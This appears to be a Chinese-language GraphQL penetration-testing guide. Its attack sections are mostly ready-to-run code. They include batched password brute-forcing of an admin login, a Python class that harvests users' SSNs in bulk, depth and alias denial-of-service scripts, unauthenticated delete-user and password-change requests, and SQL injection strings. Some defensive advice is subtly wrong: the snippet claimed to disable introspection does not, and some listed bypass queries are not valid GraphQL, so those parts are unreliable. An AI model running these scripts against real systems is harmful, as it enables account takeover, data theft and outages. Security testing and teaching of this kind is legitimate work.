# GraphQL 安全测试

> **合规声明**: 本文档仅供授权安全测试使用。未经授权对目标系统进行测试可能违反法律法规。请在获得明确书面授权后进行任何安全测试活动。

---

## 目录

1. [GraphQL 基础](#1-graphql-基础)
2. [测试点](#2-测试点)
3. [检测 Payload 示例](#3-检测-payload-示例)
4. [工具](#4-工具)
5. [防御建议](#5-防御建议供参考)

---

## 1. GraphQL 基础

### 什么是 GraphQL？

GraphQL 是一种 API 查询语言，允许客户端精确地请求所需的数据。与 REST 不同，GraphQL 使用单个端点（通常是 `/graphql`），由客户端决定返回的数据结构。

### 核心概念

#### Query（查询）— 获取数据

```graphql
# 基本查询
query {
  user(id: 1) {
    id
    name
    email
    posts {
      title
      content
    }
  }
}

# 命名查询 + 变量
query GetUser($userId: ID!) {
  user(id: $userId) {
    ...UserFields
  }
}

fragment UserFields on User {
  id
  name
  email
}
```

#### Mutation（变更）— 修改数据

```graphql
# 创建用户
mutation {
  createUser(input: {
    name: "test",
    email: "test@example.com",
    password: "P@ssw0rd"
  }) {
    id
    name
    token
  }
}

# 登录
mutation Login($email: String!, $password: String!) {
  login(email: $email, password: $password) {
    token
    user {
      id
      role
    }
  }
}
```

#### Subscription（订阅）— 实时数据

```graphql
subscription {
  messageAdded(roomId: "123") {
    id
    content
    sender {
      name
    }
  }
}
```

### 请求格式

GraphQL 请求使用 POST 发送到单个端点：

```bash
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ user(id: 1) { id name email } }"}'
```

### 常见 GraphQL 端点

```
/graphql
/graphql/console
/graphiql
/graphql/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/api/query
/query
/explorer
/playground
```

---

## 2. 测试点

### 2.1 Introspection 查询（获取完整 Schema）

Introspection 是 GraphQL 的灵魂功能 — 它允许客户端查询 API 的完整 Schema。在生产环境中未禁用 introspection 是高危信息泄露。

#### 获取所有类型

```graphql
# 基础 introspection 查询
query {
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
    }
  }
}
```

#### 获取所有 Query

```graphql
query {
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
    }
  }
}
```

#### 获取所有 Mutation

```graphql
query {
  __schema {
    mutationType {
      fields {
        name
        description
        args {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
        type {
          name
          kind
        }
      }
    }
  }
}
```

#### 速查：一行 introspection

```bash
curl -s "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"}'
```

#### Python 自动化 introspection

```python
import requests
import json

class GraphQLIntrospector:
    def __init__(self, endpoint: str):
        self.endpoint = endpoint
        self.session = requests.Session()
        self.schema = None

    def introspect(self) -> dict:
        """执行 introspection 查询"""
        # 标准 introspection 查询
        query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args {
                ...InputValue
              }
            }
          }
        }
        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args { ...InputValue }
            type { ...TypeRef }
            isDeprecated
            deprecationReason
          }
          inputFields { ...InputValue }
          interfaces { ...TypeRef }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes { ...TypeRef }
        }
        fragment InputValue on __InputValue {
          name
          description
          type { ...TypeRef }
          defaultValue
        }
        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
        """

        r = self.session.post(self.endpoint, json={"query": query})
        if r.status_code == 200 and "data" in r.json():
            self.schema = r.json()["data"]
            return self.schema
        return None

    def get_all_queries(self) -> list:
        """提取所有查询名称"""
        if not self.schema:
            return []
        queries = []
        types = self.schema.get("__schema", {}).get("types", [])
        for t in types:
            if t.get("name") == self.schema["__schema"]["queryType"]["name"]:
                for field in t.get("fields", []):
                    queries.append(field["name"])
        return queries

    def get_all_mutations(self) -> list:
        """提取所有变更操作"""
        if not self.schema:
            return []
        mutations = []
        types = self.schema.get("__schema", {}).get("types", [])
        mutation_type_name = self.schema["__schema"].get("mutationType", {}).get("name")
        if not mutation_type_name:
            return []
        for t in types:
            if t.get("name") == mutation_type_name:
                for field in t.get("fields", []):
                    mutations.append(field["name"])
        return mutations

    def print_summary(self):
        """打印 schema 摘要"""
        queries = self.get_all_queries()
        mutations = self.get_all_mutations()
        print(f"[*] Queries ({len(queries)}):")
        for q in queries:
            print(f"    - {q}")
        print(f"\n[*] Mutations ({len(mutations)}):")
        for m in mutations:
            print(f"    - {m}")


# 使用
intro = GraphQLIntrospector("https://target.com/graphql")
schema = intro.introspect()
if schema:
    intro.print_summary()
else:
    print("[!] Introspection disabled or endpoint not found")
```

#### Introspection 绕过技巧

```graphql
# 1. 使用 __schema 替代 introspection 关键字
{ __schema { types { name } } }

# 2. 添加 deprecated 参数
{ __schema { types { name fields(includeDeprecated: true) { name } } } }

# 3. 使用 alias 隐藏真实查询
query {
  a: __schema { types { name } }
}

# 4. 在 mutation 中包裹
mutation {
  x { __schema { types { name } } }
}

# 5. 使用 websocket 订阅
subscription {
  __schema { types { name } }
}

# 6. Content-Type 切换为 application/graphql
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/graphql" \
  -d 'query { __schema { types { name } } }'
```

### 2.2 批量查询攻击（Batching Attack）

GraphQL 允许在一个请求中发送多个查询。攻击者可利用此功能绕过速率限制，批量爆破数据。

#### 暴力枚举：在一个请求中测试多个密码

```graphql
# 批量登录（绕过登录限制）
query {
  a: login(email: "admin@example.com", password: "123456") { token }
  b: login(email: "admin@example.com", password: "password") { token }
  c: login(email: "admin@example.com", password: "admin") { token }
  d: login(email: "admin@example.com", password: "P@ssw0rd") { token }
  e: login(email: "admin@example.com", password: "letmein") { token }
  f: login(email: "admin@example.com", password: "welcome") { token }
}
```

#### 批量获取用户数据

```graphql
# 单请求多用户查询
query {
  user1: user(id: 1) { id name email ssn }
  user2: user(id: 2) { id name email ssn }
  user3: user(id: 3) { id name email ssn }
  user4: user(id: 4) { id name email ssn }
  user5: user(id: 5) { id name email ssn }
}
```

#### Python 自动化批量查询

```python
import requests
import json
import concurrent.futures
from typing import List, Optional

class GraphQLBatchingAttacker:
    def __init__(self, endpoint: str, token: Optional[str] = None):
        self.endpoint = endpoint
        self.session = requests.Session()
        if token:
            self.session.headers.update({"Authorization": f"Bearer {token}"})

    def batch_user_query(self, user_ids: List[int]) -> dict:
        """构建批量用户查询"""
        fields = []
        aliases = {}
        for uid in user_ids:
            alias = f"u{uid}"
            aliases[alias] = uid
            fields.append(f"""
                {alias}: user(id: {uid}) {{
                    id
                    name
                    email
                    username
                    role
                    ... on User {{
                        phone
                        ssn
                    }}
                }}
            """)
        query = "query { " + " ".join(fields) + " }"
        return query, aliases

    def attack_batch(self, user_ids: List[int], batch_size: int = 10) -> dict:
        """分批批量查询"""
        results = {}
        for i in range(0, len(user_ids), batch_size):
            batch = user_ids[i:i+batch_size]
            query, aliases = self.batch_user_query(batch)
            try:
                r = self.session.post(self.endpoint, json={"query": query})
                if r.status_code == 200:
                    data = r.json().get("data", {})
                    for alias, uid in aliases.items():
                        if data.get(alias):
                            results[uid] = data[alias]
                            print(f"[+] User {uid}: {data[alias].get('name', '?')}")
            except Exception as e:
                print(f"[!] Batch error: {e}")
        return results


# 使用
attacker = GraphQLBatchingAttacker(
    "https://target.com/graphql",
    token="USER_TOKEN"
)
# 批量查询用户 1-100
attacker.attack_batch(list(range(1, 101)), batch_size=20)
```

### 2.3 深度/复杂度攻击

利用 GraphQL 的对象关系嵌套造成数据库爆炸查询，导致 DoS。

#### 深度嵌套查询（解析器爆炸）

```graphql
# 深度递归查询（如果不限制深度）
query {
  user(id: 1) {
    posts {
      comments {
        user {
          posts {
            comments {
              user {
                posts {
                  title
                }
              }
            }
          }
        }
      }
    }
  }
}
```

#### 别名重复（查询复杂度攻击）

```graphql
# 同一个查询重复多次（利用 alias 绕名字唯一限制）
query {
  a1: user(id: 1) { id name email posts { title } }
  a2: user(id: 1) { id name email posts { title } }
  a3: user(id: 1) { id name email posts { title } }
  # ... 可以重复数千次
  a5000: user(id: 1) { id name email posts { title } }
}
```

#### Python DoS 测试

```python
import requests
import time

def test_depth_exploit(endpoint: str):
    """测试 GraphQL 深度查询限制"""
    # 构造深层嵌套查询
    def build_deep_query(depth: int) -> str:
        inner = "id"
        for i in range(depth):
            inner = f"user(id: 1) {{ id posts {{ comments {{ {inner} }} }} }}"
        return f"query {{ {inner} }}"

    for depth in [3, 5, 10, 15, 20]:
        query = build_deep_query(depth)
        start = time.time()
        try:
            r = requests.post(endpoint, json={"query": query}, timeout=30)
            elapsed = time.time() - start
            print(f"[Depth {depth}] Status: {r.status_code}, Time: {elapsed:.2f}s")
            if elapsed > 10:
                print(f"  [!] Possible resource exhaustion! Response in {elapsed:.2f}s")
        except requests.Timeout:
            print(f"[Depth {depth}] Timeout!")
        except Exception as e:
            print(f"[Depth {depth}] Error: {e}")


# 复杂度攻击：重复别名
def test_complexity_exploit(endpoint: str):
    """测试查询复杂度限制"""
    for count in [10, 50, 100, 500, 1000, 5000]:
        fields = " ".join([
            f'a{i}: user(id: 1) {{ id name email }}' 
            for i in range(count)
        ])
        query = f"query {{ {fields} }}"
        start = time.time()
        try:
            r = requests.post(endpoint, json={"query": query}, timeout=30)
            elapsed = time.time() - start
            print(f"[{count} aliases] Status: {r.status_code}, Time: {elapsed:.2f}s")
            if r.status_code == 429 or r.status_code == 413:
                print("  [!] Rate limited / payload too large")
        except Exception as e:
            print(f"[{count} aliases] Error: {e}")
```

### 2.4 未授权 Mutation

测试是否可以未经授权执行修改数据的操作。

```bash
# 测试无需认证就可以注册
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { createUser(input: {name: \"hacker\", email: \"hacker@test.com\", password: \"Test123!\"}) { id token } }"}'

# 测试无需认证就可删除
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { deleteUser(id: 1) { success } }"}'

# 测试无需认证就可修改密码
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { updatePassword(id: 1, newPassword: \"hacked123\") { success } }"}'
```

#### 常见敏感 Mutation 扫描

```python
import requests

endpoint = "https://target.com/graphql"
sensitive_mutations = [
    # 认证相关
    "resetPassword",
    "forgotPassword",
    "changePassword",
    "updatePassword",
    "deleteAccount",
    "deleteUser",

    # 提权
    "updateRole",
    "changeRole",
    "updatePermissions",
    "makeAdmin",

    # 数据操作
    "deleteAllUsers",
    "dropTable",
    "clearDatabase",
    "purgeData",

    # 配置
    "updateConfig",
    "setConfig",
    "updateSettings",
    "updateSiteConfig",
]

for mutation in sensitive_mutations:
    query = f"mutation {{ {mutation}(id: 1) {{ success }} }}"
    r = requests.post(endpoint, json={"query": query})
    if r.status_code == 200 and "errors" not in r.text:
        data = r.json()
        if data.get("data") and data["data"].get(mutation):
            print(f"[!] Unauthenticated mutation: {mutation}")
            print(f"    Response: {data['data']}")
    elif r.status_code == 200:
        # 存在 mutation 但有验证错误
        errors = r.json().get("errors", [])
        if errors:
            msg = errors[0].get("message", "")
            if "requires authentication" not in msg and "unauthorized" not in msg:
                print(f"[?] Mutation exists (auth error): {mutation}")
```

### 2.5 参数注入

#### SQL/NoSQL 注入通过 GraphQL 参数

```graphql
# 通过字符串参数注入
query {
  user(id: "1 UNION SELECT * FROM users") {
    id
    name
    email
  }
}

# 通过 ID 参数注入 NoSQL
query {
  user(id: "1; DROP TABLE users--") {
    id
    name
  }
}

# JSON 注入
mutation {
  updateUser(input: {
    id: 1,
    settings: "{ \"isAdmin\": true }"
  }) {
    id
    role
  }
}
```

#### 参数类型混淆

```graphql
# 期望 ID 类型 (Int)，传入字符串
query {
  user(id: "abc") { id name }
}

# 期望 Int，传入 float
query {
  user(id: 1.5) { id name }
}

# 期望 Boolean，传入字符串
query {
  users(active: "true") { id name }
}

# 期望字符串，传入数组
query {
  users(filter: ["admin", "user"]) { id name }
}

# 期望对象，传入 null
mutation {
  createUser(input: null) { id }
}

# 期望必填参数，不传
query {
  user { id name }
}
```

### 2.6 对象关系遍历

利用 GraphQL 的对象关系获取本不应暴露的关联数据。

```graphql
# 应该只能看到自己的订单，但通过关系遍历看到他人信息
query {
  order(id: 1) {
    id
    total
    user {
      id
      name
      email
      phone
      ssn
      creditCard {
        number
        cvv
        expiry
      }
    }
  }
}

# 通过支付记录反向查询
query {
  payment(id: 1) {
    amount
    cardLast4
    order {
      user {
        email
        orders {
          items {
            name
            price
          }
        }
      }
    }
  }
}

# 管理员日志遍历
query {
  logEntry(id: 1) {
    action
    user {
      name
      email
      sessions {
        ip
        userAgent
        loginTime
      }
    }
  }
}
```

---

## 3. 检测 Payload 示例

### 端点发现

```bash
# 批量探测 GraphQL 端点
for path in /graphql /graphiql /query /api/graphql /v1/graphql /playground /explorer; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}')
  echo "$response $path"
done
```

### 查询类型检测

```graphql
# 返回 {"data": {"__typename": "Query"}} 表示是 GraphQL 端点
{__typename}

# 如果被屏蔽，尝试以下变体：
query { __typename }
query q { __typename }
mutation { __typename }
{ query: __typename }
```

### Schema 提取最小查询

```graphql
# 最小 introspection
{__schema{types{name fields{name args{name type{name}}}}}}

# 仅获取 mutation
{__schema{mutationType{fields{name args{name}}}}}

# 仅获取敏感类型名
{__schema{types{name}}}
```

### 字段爆破

```python
import requests
import json

endpoint = "https://target.com/graphql"
common_fields = [
    "id", "name", "email", "username", "password", "token",
    "role", "isAdmin", "admin", "phone", "phoneNumber",
    "address", "ssn", "creditCard", "cardNumber", "cvv",
    "secret", "apiKey", "accessToken", "refreshToken",
    "createdAt", "updatedAt", "deletedAt",
]

# 对每种类型，逐个探测存在哪些字段
types_to_test = ["User", "user", "users", "Users"]
for type_name in types_to_test:
    for field in common_fields:
        query = f"{{ {type_name}(id: 1) {{ {field} }} }}"
        r = requests.post(endpoint, json={"query": query})
        if r.status_code == 200:
            data = r.json()
            if data.get("data") and data["data"].get(type_name, {}).get(field):
                print(f"[+] {type_name}.{field} exists")
```

### 错误信息泄露

```graphql
# 故意错误查询 → 获取错误中的信息
query {
  user(id: "invalid") {
    id
    nonExistentField  # 字段不存在
  }
}

# 用类型错误触发详细错误
query {
  user(id: [1, 2, 3]) { id name }
}

# 深度嵌套触发堆栈跟踪
query {
  user(id: 1) {
    posts {
      comments {
        user {
          posts {
            comments {
              # 持续嵌套...
            }
          }
        }
      }
    }
  }
}
```

---

## 4. 工具

### 推荐工具

| 工具 | 用途 | 链接/安装 |
|------|------|----------|
| **graphw00f** | GraphQL 指纹识别 | `pip install graphw00f` |
| **inql** | Burp Suite 插件，GraphQL 测试 | Burp App Store 安装 |
| **GraphQL Playground** | 交互式查询 IDE | 浏览器插件 |
| **GraphiQL** | 内置查询 IDE | 浏览器访问 `/graphiql` |
| **clairvoyance** | Introspection 绕过 | `git clone https://github.com/nikitastupin/clairvoyance` |
| **GraphQLmap** | GraphQL 渗透测试工具 | `pip install graphqlmap` |
| **Altair** | GraphQL 客户端 (GUI) | `snap install altair` |

### graphw00f 使用

```bash
# 安装
pip install graphw00f

# 指纹识别
graphw00f -t https://target.com/graphql

# 详细模式
graphw00f -t https://target.com/graphql -v
```

### inql（Burp Suite）

```
1. Burp Suite -> Extender -> BApp Store -> 搜索 inql
2. 安装后右键 HTTP 请求 -> Send to inql
3. 自动解析 Schema 并生成测试用例
```

### GraphQLmap

```python
# 安装: pip install graphqlmap
# 使用:
# python graphqlmap.py -u https://target.com/graphql

# 自动 introspection
> use INTERACTIVE
> SCHEMA

# SQL 注入测试
> use DUMP
> --table users --columns id,password

# 批量爆破
> use BRUTEFORCE
> --type User --fields id,password --value 1-100
```

### clairvoyance（Introspection 绕过）

```bash
# 安装
pip install clairvoyance

# 使用
clairvoyance https://target.com/graphql -o schema.json

# 通过 websocket 绕过
clairvoyance https://target.com/graphql --ws wss://target.com/subscriptions -o schema.json
```

---

## 5. 防御建议（供参考）

### 生产环境安全配置

1. **禁用 Introspection**（生产环境）
   ```python
   # 示例：禁用 introspection
   from graphql import validate, specified_rules
   custom_rules = [r for r in specified_rules if r.name != 'NoSchemaIntrospection']
   ```

2. **实施查询深度限制**
   ```python
   # 限制最大嵌套深度
   validation_rules.append(DepthLimitValidator(max_depth=6))
   ```

3. **实施查询复杂度限制**
   ```python
   # 每个查询的复杂度得分上限
   validation_rules.append(QueryComplexityLimit(max_complexity=1000))
   ```

4. **实施批量查询限制**
   ```python
   # 限制单请求的字段数/别名数
   validation_rules.append(AliasesLimit(max_aliases=20))
   ```

5. **速率限制**
   - 基于 IP 和 Token 的限流
   - 对成本高的查询单独限流

6. **认证与授权**
   - 所有 Mutation 必须检查权限
   - Query 字段级别权限控制
   - 遵循最小权限原则

7. **字段级访问控制**
   ```python
   # 示例：敏感字段需要特殊权限
   class UserType:
       ssn = String(required=is_admin())
       email = String(required=is_authenticated())
   ```

8. **Timeout 设置**
   ```python
   # 每个查询的执行超时时间
   timeout_seconds=10
   ```

### 安全测试清单

- [ ] Introspection 是否在生产环境禁用
- [ ] 是否存在未授权 Mutation
- [ ] 查询深度限制是否有效
- [ ] 查询复杂度限制是否有效
- [ ] 批量查询/别名数量是否受限
- [ ] 是否存在敏感字段泄露
- [ ] 参数输入是否充分验证
- [ ] 错误信息是否泄漏调试信息
- [ ] 对象关系遍历是否存在越权
- [ ] WebSocket 订阅是否同样受到限制

> **提醒**: 所有 GraphQL 安全测试需在授权范围内进行。Schema 中包含敏感信息（如密码字段、管理操作）时需立即报告。
